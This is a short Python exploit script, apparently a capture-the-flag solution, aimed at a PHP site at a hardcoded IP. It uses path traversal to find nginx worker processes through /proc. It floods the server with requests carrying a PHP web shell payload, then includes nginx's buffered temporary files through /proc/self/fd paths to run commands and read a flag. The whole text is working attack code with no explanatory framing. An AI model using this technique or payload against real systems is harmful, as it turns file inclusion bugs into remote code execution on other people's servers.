import sys,threading, requests
URL = f'http://20.196.197.149:8000/'
cpus = 0
pid_max = 4194304
nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'page': f'../../../../../../proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False
def uploader():
    while not done:
        requests.get(URL, data='<?php system($_GET["cmd"]); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()
def attack(pid):
    global done

    while not done:
        print(f'{pid}')
        for fd in range(4, 32):
            f = f'../../../../../proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                'page': f,
                'cmd': f'/readflag'
            })
            if r.text:
                print(f'flag: {r.text[:50]}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=attack, args=(pid, ))
    a.start()
